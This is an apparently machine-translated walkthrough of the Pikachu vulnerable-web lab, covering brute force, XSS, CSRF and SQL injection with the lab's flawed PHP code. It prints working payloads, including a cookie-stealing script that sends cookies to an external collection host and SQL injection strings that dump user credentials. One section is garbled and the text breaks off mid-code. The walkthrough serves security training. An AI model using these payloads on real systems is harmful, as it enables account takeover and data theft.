pikachu-WalkThrough
disclaimer
This document is for learning and research purposes only. Please do not use the technical source code in this document for illegal purposes. Any negative impact caused by anyone has nothing to do with me.

Range project address

https://github.com/zhuifengshaonianhanlu/pikachu
knowledge points

Burte Force
Form-based brute force
Captcha bypass (on server)
Captcha bypass (on client)
Token explosion-proof?
XSS
reflective xss(get)
reflective xss(post)
Stored xss
DOM type xss
DOM type xss-x
xss blind typing
Filtering of xss
htmlspecialchars for xss
href output of xss
js output of xss
CSRF
CSRF (get)
CSRF(POST)
CSRF Token
Sql Inject
digital injection (post)
Character injection (get)
search injection
type xx injection
"insert/update" injection
"delete" injection
"http header" injection
Blind (base on boolian)
Blind (base on time)
wide byte injection
RCE
exec "ping"
exec "eval"
File Inclusion
The local file contains
The remote file contains
Unsafe Filedownload
Unsafe Fileupload
client check
MIME type
getimagesize
Over Permission
Horizontal overreach
vertical override
../../ directory traversal
Sensitive Information Leakage
PHP deserialization
XXE
URL redirection
SSRF
SSRF(curl)
SSRF(file_get_content)
lab environment

The environment is for reference only

phpstudy: http://phpstudy.php.cn/
Microsoft Windows 10 Enterprise LTSC - 10.0.17763
VMware® Workstation 15 Pro - 15.0.0 build-10134415
kali 4.19.0-kali3-amd64
pikachu - Commits on Feb 9, 2019
foreword
Excellent web basic shooting range, compared with dvwa, dvwa is more suitable for teaching, pikachu has more types of loopholes, the recommended order of clearance dvwa --> pikachu

build/use
windows

Put the downloaded pikachu folder in the root directory of the web server;
Modify the database connection configuration in inc/config.inc.php according to the actual situation;
Visit http://x.x.x.x/pikachu, there will be a red warm prompt "Welcome to use, pikachu has not been initialized, click to initialize the installation!", click to complete the installation
Burte_Force
"Brute force cracking" is an attack method. In web attacks, this method is generally used to obtain the authentication information of the application system. The process is to use a large amount of authentication information to try to log in on the authentication interface until the correct result is obtained. . In order to improve efficiency, brute force cracking generally uses tools with dictionaries for automated operations.

Theoretically speaking, most systems can be cracked by brute force, as long as the attacker has enough computing power and time, so it is not absolute to determine whether a system has a brute force cracking vulnerability. We say that a web application system There is a brute force cracking vulnerability, which generally means that the web application system does not adopt or adopts a relatively weak authentication security policy, resulting in a relatively high "possibility" of being brute force cracked. The authentication security policy here includes:

Whether to require users to set complex passwords;
Do you use a secure verification code every time you authenticate (think about the verification code you input when you buy a train ticket~) or mobile phone otp;
Whether to judge and restrict attempts to log in (such as: 5 consecutive wrong logins, account lock or IP address lock, etc.);
Whether two-factor authentication is used;
...and so on. Don't underestimate the vulnerability of brute force cracking, often the effect of this simple and crude attack method is beyond expectations!

Form-based brute force
Server-side core code

//Typical problem, no verification code, no other control measures, can be violently cracked
if(isset($_POST['submit']) && $_POST['username'] && $_POST['password']){

     $username = $_POST['username'];
     $password = $_POST['password'];
     $sql = "select * from users where username=? and password=md5(?)";
     $line_pre = $link->prepare($sql);

     $line_pre->bind_param('ss', $username, $password);

     if($line_pre->execute()){
         $line_pre->store_result();
         if($line_pre->num_rows>0){
             $html.= '<p>login success</p>';

         } else{
             $html.= '<p> username or password is not exists～</p>';
         }

     } else{
         $html.= '<p>Execution error:'.$line_pre->errno.'Error information:'.$line_pre->error.'</p>';
     }

}
exploit

Enter the Pikachu shooting range, click on Brute Force -> Form-Based Brute Force;
Enter a pair of account and password at will in the account name and password column, such as 0 / 0 ; if you log in directly with nothing left, there will be problems with the captured package, and the returned length will be the same
Click login, go back to Burp to view the captured data packets, right click and select 'Send to Intruder',
In Intruder -> Options, select Cluster bomb (cluster blasting) in the attack type Attack type, and clear the mark on the right side;
Double-click to select the character position entered in the previous login and add it into the dictionary loading option; Note that in the loading settings, both the account name and password must be loaded into the dictionary for blasting
After everything is set, click Start attack on the upper right to start blasting.
Observe the returned result page, click Length, and you can see that there are several inputs with special return length values. These groups are likely to be the correct account and password that were blasted out.
Captcha bypass (on_server)
Server-side core code

$html="";
if(isset($_POST['submit'])) {
     if (empty($_POST['username'])) {
         $html .= "<p class='notice'>Username cannot be empty</p>";
     } else {
         if (empty($_POST['password'])) {
             $html .= "<p class='notice'>Password cannot be empty</p>";
         } else {
             if (empty($_POST['vcode'])) {
                 $html .= "<p class='notice'>The verification code cannot be empty!</p>";
             } else {
// Verify that the verification code is correct
                 if (strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])) {
                     $html .= "<p class='notice'>Verification code input error!</p>";
                     //The $_SESSION['vcode'] should be destroyed after the verification is completed
                 }else{

                     $username = $_POST['username'];
                     $password = $_POST['password'];
                     $vcode = $_POST['vcode'];

                     $sql = "select * from users where username=? and password=md5(?)";
                     $line_pre = $link->prepare($sql);

                     $line_pre->bind_param('ss', $username, $password);

                     if($line_pre->execute()){
                         $line_pre->store_result();
                         //Although the previous judgment was empty, but in the end, the verification code was not verified!!!
                         if($line_pre->num_rows()==1){
                             $html.='<p>login success</p>';
                         }else{
                             $html.= '<p> username or password is not exists～</p>';
                         }
                     }
                     else {
                         $html.= '<p>Execution error:'.$line_pre->errno.'Error information:'.$line_pre->error.'</p>';
                     }
                 }
             }
         }
     }
}
The server only checked the verification code once, and then did not expire the verification code. It is always valid and can be verified for repeated blasting

exploit

Burpsuite, grab a verification code and enter the correct request, you can repeat the blasting



Captcha bypass (on_client)
Server-side core code

if(isset($_POST['submit'])){
     if($_POST['username'] && $_POST['password']) {
         $username = $_POST['username'];
         $password = $_POST['password'];
         $sql = "select * from users where username=? and password=md5(?)";
         $line_pre = $link->prepare($sql);


         $line_pre->bind_param('ss', $username, $password);

         if ($line_pre->execute()) {
             $line_pre->store_result();
             if ($line_pre->num_rows > 0) {
                 $html .= '<p>login success</p>';

             } else {
                 $html .= '<p> username or password is not exists～</p>';
             }

         } else {
             $html .= '<p>Execution error:' . $line_pre->errno . 'Error message:' . $line_pre->error . '</p>';
         }

     }else{
         $html .= '<p> please input username and password～</p>';
     }
}
client core code

<script language="javascript" type="text/javascript">
     var code; //Define verification code globally
     function createCode() {
         code = "";
         var codeLength = 5;//The length of the verification code
         var checkCode = document. getElementById("checkCode");
         var selectChar = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9,'A','B','C','D','E','F', 'G','H','I','J','K','L','M','N','O','P','Q','R','S ','T','U','V','W','X','Y','Z');//All characters that can make up the verification code can also be used in Chinese

         for (var i = 0; i < codeLength; i++) {
             var charIndex = Math. floor(Math. random() * 36);
             code += selectChar[charIndex];
         }
         //alert(code);
         if (checkCode) {
             checkCode. className = "code";
             checkCode. value = code;
         }
     }

     function validate() {
         var inputCode = document.querySelector('#bf_client.vcode').value;
         if (inputCode. length <= 0) {
             alert("Please enter the verification code!");
             return false;
         } else if (inputCode != code) {
             alert("Verification code input error!");
             createCode();//Refresh verification code
             return false;
         }
         else {
             return true;
         }
     }


     createCode();
</script>
The client does verification code verification, the server does not verify

exploit

Burp grabs a correct package and removes the verification code part directly to continue blasting

Token explosion-proof?
Server-side core code

if(isset($_POST['submit']) && $_POST['username'] && $_POST['password'] && $_POST['token']==$_SESSION['token']){

    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql = "select * from users where username=? and password=md5(?)";
    $line_pre = $link->prepare($sql);


    $line_pre->bind_param('ss',$username,$password);

    if($line_pre->execute()){
        $line_pre->store_result();
        if($line_pre->num_rows>0){
            $html.= '<p> login success</p>';

        } else{
            $html.= '<p> username or password is not exists～</p>';
        }

    } else{
        $html.= '<p>执行错误:'.$line_pre->errno.'错误信息:'.$line_pre->error.'</p>';
    }

}

//生成token
set_token();

what is token

To put it simply, token is a string of strings generated by the server as an identifier for the client to request from the server. Use the username/password to send a request for authentication to the server at the front end. If the server authenticates successfully, then the server will Return the token to the front end, and the front end will bring the token sent by the server to prove its legitimacy in each request.

exploit

Burp grabs a correct package and sets the following two as variables



Click Add in Grep Extract in Option, click Refetch response, find the returned package, and find the token returned from the server. For easy search, you can enter token in the bottom input field to directly find the value of the token



Select the value of the token, copy it, and click OK in the selected state, and at the same time check always at the bottom of Option, and set the thread to 1. If you do not set the thread to 1, an error will occur

Next, set the Payloads, and import the dictionary directly for the password Payloads.



Set the parameter of token Payloads to Recursive grep, and select the first item in Payload Options, and input the previously copied token value into the input field below. Start blasting.



Slightly behind

XSS
Cross-Site Scripting is referred to as "CSS" for short. In order to avoid conflicts with the abbreviation "CSS" of the front-end stacked style sheet, it is also called XSS. Generally, XSS can be divided into the following common types:

Reflected XSS;
Stored XSS;
DOM type XSS;
XSS vulnerability has always been evaluated as the most harmful vulnerability in web vulnerabilities, and it has always been in the top three in the ranking of OWASP TOP10.

XSS is a vulnerability that occurs on the front-end browser side, so its harmful objects are also front-end users.

The main reason for the formation of XSS vulnerabilities is that the program does not properly process the input and output, resulting in the "well-constructed" character output being parsed and executed by the browser as valid code at the front end, causing harm.

Therefore, in the prevention of XSS vulnerabilities, the methods of "filtering input" and "escaping output" are generally adopted:

Input filtering: filter the input, and do not allow the input of characters that may cause XSS attacks;
Output escaping: properly escape the content output to the front end according to the location of the output point;
Simple testing process for cross-site scripting vulnerabilities

Find input points on the target site, such as query interfaces, message boards, etc.;
Enter a set of "special characters + unique identification characters", click submit, and check the returned source code to see if there is any corresponding processing;
Locate the unique character by searching, and combine the grammar before and after the unique character to confirm whether the condition for executing js can be constructed (construction closure); submit the constructed script code to see if it can be successfully executed, and if it is successfully executed, it means that there is an XSS vulnerability;
Reflective xss (get)


Server-side core code
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入'kobe'试试-_-</p>";
    }else{
        if($_GET['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_GET['message']}一样,永远年轻,永远热血沸腾!</p><img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_GET['message']},i don't care!</p>";
        }
    }
}

exploit

According to the process, in order to find the input point, first submit a set of special characters + unique identification characters, and then check the source code



The figure below shows that the input characters are directly input into the P tag, and there is an output point here

F12 Modify the front-end quantity limit, input payload <script>alert('沵咑礷赇潒礤蒣騉')</script> click submit



After refreshing once, there will be no pop-up window, saying that this is only a one-time.

reflective xss(post)
The POST request is different from the GET request. The POST request cannot allow the user to submit data to the server from the URL. Therefore, in order to perform injection, the user needs to submit the POST request instead of the attacker. This requires the attacker to build the site by himself, and then write a POST in the site. Form, and send the connection we built to the user, so that the user can submit a POST request to the attacker with an XSS vulnerability. In this way, the user's cookie can be stolen, and the user login can be forged to achieve the purpose of destruction.

Server-side core code
if(isset($_POST['submit'])){
    if(empty($_POST['message'])){
        $html.="<p class='notice'>输入'kobe'试试-_-</p>";
    }else{

        //下面直接将前端输入的参数原封不动的输出了,出现xss
        if($_POST['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_POST['message']}一样,永远年轻,永远热血沸腾!</p><img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_POST['message']},i don't care!</p>";
        }
    }
}

exploit

Same as the get type above, but F12 is not needed here to modify the input limit, input payload <script>alert('粵咑礷赇罒礤蒣騉')</script> click submit

Stored xss
Server-side core code
if(array_key_exists("message",$_POST) && $_POST['message']!=null){
    $message=escape($link, $_POST['message']);
    $query="insert into message(content,time) values('$message',now())";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)!=1){
        $html.="<p>数据库出现异常,提交失败!</p>";
    }
}

if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){

    //彩蛋:虽然这是个存储型xss的页面,但这里有个delete的sql注入
    $query="delete from message where id={$_GET['id']}";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        echo "<script type='text/javascript'>document.location.href='xss_stored.php'</script>";
    }else{
        $html.="<p id='op_notice'>删除失败,请重试并检查数据库是否还好!</p>";

    }

}

exploit

With the previous idea, first input a set of special characters + unique identification characters, check the source code, you can find that the output point is the same as the reflective XSS.



Enter payload <script>alert('Old iron, Oli!')</script> click submit

Refresh it again, it will still return the content entered in the set payload, indicating that the inserted content will be stored in the database, which will cause continuous attacks. The inserted payload can also be seen in the source code.

DOM type xss
What is DOM

The full name of DOM is Document Object Model, which is the document object model. We can understand DOM as an interface independent of the system platform and programming language. Programs and scripts can dynamically access and modify document content, structure and style through this interface. When a page is created and loaded into the browser, DOM will be born quietly. It will convert the webpage document into a document object, and its main function is to process the content of the webpage. Therefore, the Javascript language can be used to manipulate the DOM to achieve the purpose of the webpage.

What is DOM-style XSS

First of all, DOM-type XSS is actually a special type of reflection-type XSS, which is a vulnerability based on the DOM document object model. There are many page elements in the website page. When the page reaches the browser, the browser will create a page for the page. The top-level Document object document object, and then generate various sub-document objects, each page element corresponds to a document object, and each document object contains properties, methods and events. The document object can be edited through JS script to modify the elements of the page. That is to say, the client's script program can dynamically modify the page content through the DOM, obtain the data in the DOM from the client and execute it locally. Based on this feature, you can use JS scripts to realize the use of XSS vulnerabilities

core code
<div id="xssd_main">
                <script>
                    function domxss(){
                        var str = document.getElementById("text").value;
                        document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
                    }
                    //试试:'><img src="#" onmouseover="alert('xss')">
                    //试试:' onclick="alert('xss')">,闭合掉就行
                </script>
                <!--<a href="" onclick=('xss')>-->
                <input id="text" name="text" type="text"  value="" />
                <input id="button" type="button" value="click me!" onclick="domxss()" />
                <div id="dom"></div>
            </div>
            
            
 exploit

Enter test#!12 to test, F12 to view the source code, find out that the injectable point is <a href="test#!12">what do you see?</a>, and construct a closure for href, so that it can realize the A "control" role for the a tag.

The payload structure is as follows '> <marquee loop="99" onfinish=alert(1)>hack the planet</marquee>



DOM type xss-x
core code

<div id="xssd_main">
                <script>
                    function domxss(){
                        var str = window.location.search;
                        var txss = decodeURIComponent(str.split("text=")[1]);
                        var xss = txss.replace(/\+/g,' ');
//                        alert(xss);

                        document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
                    }
                    //试试:'><img src="#" onmouseover="alert('xss')">
                    //试试:' onclick="alert('xss')">,闭合掉就行
                </script>
                <!--<a href="" onclick=('xss')>-->
                <form method="get">
                <input id="text" name="text" type="text"  value="" />
                <input id="submit" type="submit" value="请说出你的伤心往事"/>
                </form>
                <div id="dom"></div>
            </div>

exploit

Same as the previous steps, check the source code, and distinguish the first DOM demo, the input is obtained from the parameters of the URL (similar to the reflection type), but the output is still in the a tag, so set the payload the same as the previous method

The payload structure is as follows '> <marquee loop="99" onfinish=alert(1)>hack the planet</marquee>

xss blind typing
Server-side core code

if(array_key_exists("content",$_POST) && $_POST['content']!=null){
     $content=escape($link, $_POST['content']);
     $name=escape($link, $_POST['name']);
     $time=$time=date('Y-m-d g:i:s');
     $query="insert into xssblind(time,content,name) values('$time','$content','$name')";
     $result=execute($link, $query);
     if(mysqli_affected_rows($link)==1){
         $html.="<p>Thank you for participating, we have received your opinion!</p>";
     } else {
         $html.="<p>ooo. There is an exception in the submission, please resubmit</p>";
     }
}
XSS blind typing means that the attacker submits malicious JS code without knowing whether there is an xss vulnerability in the background, and the website uses the malicious code inserted by the attacker when the background position is displayed behind an input box such as a message board. When the background administrator is operating, it will trigger the inserted malicious code, so as to achieve the purpose of the attacker.

exploit

Enter payload <script>alert('Old iron, Oli!')</script> , observe the injection point, log in to the background as an administrator, and a pop-up window will appear. This is a simple touch typing. The cookie can be obtained through the xss phishing method, and the administrator can be forged to log in.



Background: http://<IP address!!!>/pikachu/vul/xss/xssblind/admin_login.php
Account password: admin 123456
Go to the pikachu platform to manage tools, go in and initialize the platform

Pirate cookie payload <script>document.location = 'http://<xss platform address>/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>



Xss filtering
Server-side core code

if(isset($_GET['submit']) && $_GET['message'] != null){
     //Here we will use regex to replace <script with empty, that is, to filter out
     $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message' ]);
     if ($message == 'yes'){
         $html.="<p>Then go to People's Square and sit alone for a while!</p>";
     }else{
         $html.="<p>Don't say these '{$message}' words, don't be afraid, just do it!</p>";
     }

}
The comments here are very clear, so I won’t say much

exploit

After filtering <script , there are still many tags that can be used, and there are still many bypass methods

payload: <marquee loop="99" onfinish=alert(1)>hack the planet</marquee>

payload: <ScrIpT>alert('Old Iron, Oli!')</sCriPt>

htmlspecialchars of xss
Server-side core code

if(isset($_GET['submit'])){
     if(empty($_GET['message'])){
         $html.="<p class='notice'>Enter something!</p>";
     } else {
         //Is it okay to use htmlspecialchars for processing, htmlspecialchars is not processed by default
         $message=htmlspecialchars($_GET['message']);
         $html1.="<p class='notice'>Your input has been recorded:</p>";
         //The input content is processed and output to the value attribute of the input tag, try:'onclick='alert(111)'
// $html2.="<input class='input' type='text' name='inputvalue' readonly='readonly' value='{$message}' style='margin-left:120px;display:block; background-color:#c0c0c0;border-style:none;'/>";
         $html2.="<a href='{$message}'>{$message}</a>";
     }
}
htmlspecialchars(string,flags,character-set,double_encode)

The htmlspecialchars() function converts some predefined characters into HTML entities.

The htmlspecialchars() function converts predefined characters into HTML entities, thereby invalidating XSS attacks. However, the default configuration of this function does not filter single quotes and double quotes. Only when quotestyle is set to specify how to encode single quotes and double quotes can it be filtered drop single quotes

exploit

First enter the predefined characters &<s>"11<>11'123<123>, check the code at the front end to see if there are single or double quotes filtered out



It can be seen that after the single quotation mark comes out

Construct a payload 'onclick='alert(1)'



href output of xss
Server-side core code

if(isset($_GET['submit'])){
     if(empty($_GET['message'])){
         $html.="<p class='notice'>I asked you to enter a url, why don't you listen?</p>";
     }
     if($_GET['message'] == 'www.baidu.com'){
         $html.="<p class='notice'>Damn, I really can't think of you being such a person</p>";
     } else {
         //The output is in the href attribute of the a tag, you can use the javascript protocol to execute js
         //Defense: Only http, https are allowed, followed by htmlspecialchars processing
         $message=htmlspecialchars($_GET['message'],ENT_QUOTES);
         $html.="<a href='{$message}'> Please click on the URL you entered</a>";
     }
}
exploit
First enter some strings &<s>"11<>11'123<123>, check the source code of the front end, and find that the characters entered have been escaped. But the href attribute of the <a> tag can also execute JS expressions of



Construct a payload Javascript:alert('1')



js output of xss
Server-side core code

if(isset($_GET['submit']) && $_GET['message'] !=null){
     $jsvar=$_GET['message'];
// $jsvar=htmlspecialchars($_GET['message'],ENT_QUOTES);
     if($jsvar == 'tmac'){
         $html.="<img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/tmac.jpeg' />";
     }
}
<script>
     $ms='<?php echo $jsvar;?>';
     if ($ms. length != 0){
         if($ms == 'tmac'){
             $('#fromjs').text('tmac is really powerful, look at the little eyes..')
         } else {
// alert($ms);
             $('#fromjs').text('No matter what, don't give up what you love..')
         }

     }
</script>
exploit

First enter some strings &<s>"11<>11'123<123>, view the source code of the front end



For JS code, we need to construct a closure to construct payload abc'</script><script>alert(1)</script> according to the displayed code



CSRF
How to Confirm the Existence of a CSRF Vulnerability

Mark the additions, deletions and modifications of the target website, and observe its logic to determine whether the request can be forged

For example, when modifying the administrator account, there is no need to verify the old password, which makes the request easy to be forged;

For example, the modification of sensitive information does not use secure token verification, which makes the request easy to be forged;

Confirm the validity period of the certificate (this problem will increase the probability of CSRF being exploited)

Although the browser is exited or closed, the local cookies are still valid, or the session has not expired in time, which makes CSRF attacks easier

CSRF (get)
First log in, modify personal information, and capture packets on Brup Suite, modify the captured URL (with yourself as the attacker), and then send it to the attack target (with yourself as the attacked)



exploit

With a slight modification, test

http://<server IP!!!>/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=futa&phonenum=110&add=123&email=lili%40pikachu.com1&submit=submit



CSRF(POST)
Similarly, log in, modify personal information, and capture packets on Brup Suite. For POST type, the request can no longer borrow user rights by modifying the URL, so you need to make a form yourself, and then return to the submission page to complete the modification.

exploit

Generate poc form directly from burp



<html>
   <!-- CSRF PoC - generated by Burp Suite Professional -->
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="http://<IP address>/pikachu/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
       <input type="hidden" name="sex" value="futa1" />
       <input type="hidden" name="phonenum" value="1110" />
       <input type="hidden" name="add" value="1213" />
       <input type="hidden" name="email" value="lil1i&#64;pikachu&#46;com1" />
       <input type="hidden" name="submit" value="submit" />
       <input type="submit" value="Submit request" />
     </form>
   </body>
</html>


CSRF_Token
To resist CSRF, the key is to put information that attackers cannot forge in the request, and the information does not exist in the cookie. Therefore, a random code can be added to each request, and the random code must be verified in the background.



exploit

If you have done csrf at the same level as dvwa, you should be clear, here you can use xss to cooperate with stealing tokens to cause csrf, here is a little bit

Sql_Inject
In the top 10 list released by owasp, the injection vulnerability has always been the number one vulnerability in the list of hazards, among which the database injection vulnerability bears the brunt of the injection vulnerability.

A serious SQL injection vulnerability may directly cause a company to go bankrupt!

The main reason for the formation of SQL injection vulnerabilities is that in data interaction, when the front-end data is passed to the background for processing, no strict judgment is made, resulting in the incoming "data" being spliced into SQL statements and treated as SQL statements. Part of the execution. As a result, the database is damaged (taken off pants, deleted, or even the entire server authority falls).

When building code, the following strategies are generally used to prevent SQL injection vulnerabilities:

Filter the variables passed into the SQL statement, and do not allow dangerous characters to be passed in;
Use parameterization (Parameterized Query or Parameterized Statement);
In addition, there are currently many ORM frameworks that automatically use parameterization to solve the injection problem, but they also provide a "stitching" method, so you need to be careful when using it!
digital injection (post)
Server-side core code

if(isset($_POST['submit']) && $_POST['id']!=null){
     //There is no processing here, just put it into select to form Sql injection
     $id=$_POST['id'];
     $query="select username,email from member where id=$id";
     $result=execute($link, $query);
     //If you use ==1 here, it will be stricter
     if(mysqli_num_rows($result)>=1){
         while($data=mysqli_fetch_assoc($result)){
             $username=$data['username'];
             $email=$data['email'];
             $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
         }
     }else{
         $html.="<p class='notice'>The user id you entered does not exist, please re-enter!</p>";
     }
}
exploit

Capture packets, view post parameters



construct payload

1' or '1' = '1 error

1 or 1 =1 No error is reported, there is digital injection



Character injection (get)
Server-side core code
  
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理,直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型,需要考虑闭合
    $query="select id,email from member where username='$name'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在,请重新输入!</p>";
    }
}
  
exploit

construct payload

http://<IP address!!!>/pikachu/vul/sqli/sqli_str.php?name=1' or '1' ='1&submit=%E6%9F%A5%E8%AF%A2



search injection
Server-side core code

if(isset($_GET['submit']) && $_GET['name']!=null){

     //There is no processing here, just spell it into the select
     $name=$_GET['name'];

     //The variable here is a fuzzy match, which needs to be closed
     $query="select username,id,email from member where username like '%$name%'";
     $result=execute($link, $query);
     if(mysqli_num_rows($result)>=1){
         // Easter eggs: There is also an xss here
         $html2.="<p class='notice'>The results of {$_GET['name']} in the username are as follows:<br />";
         while($data=mysqli_fetch_assoc($result)){
             $uname=$data['username'];
             $id=$data['id'];
             $email=$data['email'];
             $html1.="<p class='notice'>username:{$uname}<br />uid:{$id} <br />email is: {$email}</p>";
         }
     }else{

         $html1.="<p class='notice'>0o... The information you entered was not found!</p>";
     }
}
exploit

Enter a letter at will, and you can see that the corresponding information is matched. Then follow the SQL fuzzy query command select * from table name where field name like '% (corresponding value)%'; and find that you can follow the previous idea to achieve universal Concatenation of sentences.

Construct payload ' or 1=1 #

There is also an xss here '# <script>alert('沵咑礷赇潒礤蒣騉')</script>

union injection

The union operator is used to combine two or more sets of SQL statements to obtain a combined query result.

Take the database of the pikachu platform as an example, enter select id,email from member where username='kevin' union select username,pw from member where id=1 ; view the query results.



However, an error may occur when combining multiple SQL statements, because the query field cannot exceed the field of the main query. At this time, order by can be added after the SQL statement for sorting. This method can determine the field of the main query. Return to the pikachu platform, in Under SQL injection, open the search column at will, and enter the order by statement we constructed for testing.

Enter ' order by 4#% , an error will be reported

Enter ' order by 3#% , no error is reported, and there are three fields in the main query through this simple method.

Construct payload: a' union select database(),user(),version()#%



information_schema injection

The information_schema database is the database that comes with the MySQL system. It stores information about all other databases maintained by the MySQL server. Through information_schema injection, we can steal all the contents of the entire database. Next is the demonstration of information_schema injection. In the previous steps, use order by to determine the query field. First find out the name of the database, enter a' union select database(), user(), 4#% to get feedback, and judge the database name as pikachu.



To get the table name, enter: a' union select table_schema, table_name, 2 from information_schema.tables where table_schema='pikachu'#



To get the field name, enter: a'union select table_name, column_name, 2 from information_schema.columns where table_name='users'#%



Get data, input: a'union select username,password,4 from users#%



Error reporting under select

select/insert/update/delete can use error reporting to get information.

UPDATEXML(xml_document, XPathstring, new_value)

Updatexml() function: change (find and replace) the value of the qualified node in the XML document.

The first parameter: fiedname is in String format, which is the field name in the table.
The second parameter: XPathstring (string in XPath format).
The third parameter: new_value, in String format, replaces the found X that meets the conditions
Change the value of XPATH_string in XML_document

And our injection statement is: a' and updatexml(1,concat(0x7e,(SELECT @@version)),0)#

The concat() function is to concatenate it into a string, so it will not conform to the format of XPATH_string, so a format error occurs, and ERROR 1105 (HY000): XPATH syntax error: ':root@localhost' is displayed

To get the name of the database table, enter: a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)# , but the feedback error indicates that only one line can be displayed, so Use limit to display line by line



Enter a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0)# Change the number behind the limit pikachu'limit 0, burst table name







Field name a' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0)# Change the number after the limit, burst table name









Data a' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#



Data a' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#



type xx injection
Server-side core code

if(isset($_GET['submit']) && $_GET['name']!=null){
     //There is no processing here, just spell it into the select
     $name=$_GET['name'];
     //The variable here is a character type, which needs to be closed
     $query="select id,email from member where username=('$name')";
     $result=execute($link, $query);
     if(mysqli_num_rows($result)>=1){
         while($data=mysqli_fetch_assoc($result)){
             $id=$data['id'];
             $email=$data['email'];
             $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
         }
     }else{

         $html.="<p class='notice'>The username you entered does not exist, please re-enter!</p>";
     }
}
exploit

Referring to the code, the character type is used here and no similar query is used, but this is not important, the key is to construct a closed

payload: ' or '1' = '1#

"insert/update" injection
Insert injection means that the front-end registration information will eventually be inserted into the database by the background through the insert operation. When the background receives the front-end registration data, it does not do anti-SQL injection processing, so that the front-end input can be directly spliced with SQL into the back-end insert related content. , leading to insert injection.

Server-side core code

if(isset($_POST['submit'])){
     if($_POST['username']!=null &&In the above search-type injection, it demonstrates that the select class reports an error to obtain information, and insert and update are actually similar

Test the insert injection first, enter ' on the registration page to view the observation of the back-end feedback, and learn that the submitted content has participated in splicing in the background by observing the error report.



Version 1' or updatexml(1,concat(0x7e,(version())),0) or'')#

Table name 1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0) or'')#



The old rules, the number after changing the limit

Field name 1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0) or'')#



The old rules, the number after changing the limit

Data 1' or updatexml(1,concat(0x7e,(select username from users limit 0,1)),0) or'')#



Data 1' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or'')#



Test update below

Server-side core code

if(isset($_POST['submit'])){
     if($_POST['sex']!=null && $_POST['phonenum']!=null && $_POST['add']!=null && $_POST['email']!=null){
// $getdata=escape($link, $_POST);

         //Unescaped, form injection, sql operation type is update
         $getdata=$_POST;
         $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email ='{$getdata['email']}' where username='{$_SESSION['sqli']['username']}'";
         $result=execute($link, $query);
         if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
             header("location:sqli_mem.php");
         } else {
             $html1.='Modification failed, please try again';

         }
     }
}
exploit

Version 1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = <Note!!! Here is your username>;#

For example mine: 1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = 123;#





The rest is a little bit behind, I'm tired

"delete" injection
Server-side core code

// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
// Did not process the incoming id, resulting in DEL injection
if(array_key_exists('id', $_GET)){
     $query="delete from message where id={$_GET['id']}";
     $result=execute($link, $query);
     if(mysqli_affected_rows($link)==1){
         header("location:sqli_del.php");
     }else{
         $html.="<p style='color: red'>Delete failed, check if the database is down</p>";
     }
}
exploit

Capture packet GET /pikachu/vul/sqli/sqli_del.php?id=1 HTTP/1.1

Parameter id can try sql error injection to construct payload

1 or updatexml(1,concat(0x7e,database()),0)

Convert the replacement ID through URL conversion encoding that comes with Burp Suite





Slightly behind

"http_header" injection
Server-side core code

if(isset($_GET['logout']) && $_GET['logout'] == 1){
     setcookie('ant[uname]','',time()-3600);
     setcookie('ant[pw]','',time()-3600);
     header("location:sqli_header_login.php");
}
?>
exploit



After logging in, go to Burp to find the login GET request, send the request to the Repeater module, remove User-Agent:, then enter 's and then run it to observe the MYSQL syntax error and find that there is a SQL injection vulnerability.



Burst database name payload: firefox' or updatexml(1,concat(0x7e,database ()),0) or '



Slightly behind

Blind (base_on_boolian)
Blind injection means that in the process of sql injection, after the selection of sql statement execution, the error data cannot be echoed to the front page (the error message shielding method is used in the background to block the error report). When sql injection cannot be performed through the returned information, use Some methods to judge the length of the table name, the length of the column name and other data, and then the process of blasting out the database data is called blind injection.

Server-side core code

if(isset($_GET['submit']) && $_GET['name']!=null){
